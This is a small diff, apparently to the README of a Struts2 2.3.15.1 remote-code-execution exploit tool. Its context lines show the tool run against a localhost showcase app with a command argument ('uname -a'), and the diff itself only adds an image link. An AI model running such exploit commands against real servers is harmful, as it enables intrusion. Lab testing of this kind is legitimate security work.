@@ -21,3 +21,4 @@ python2 struntsrce.py --target=http://localhost:8080/struts2_2.3.15.1-showcase/s
 
 python2 struntsrce.py --target=http://localhost:8080/struts2_2.3.15.1-showcase/showcase.action --cmd='uname -a'
 
+<img src="http://i.imgur.com/o5y9drq.jpg">
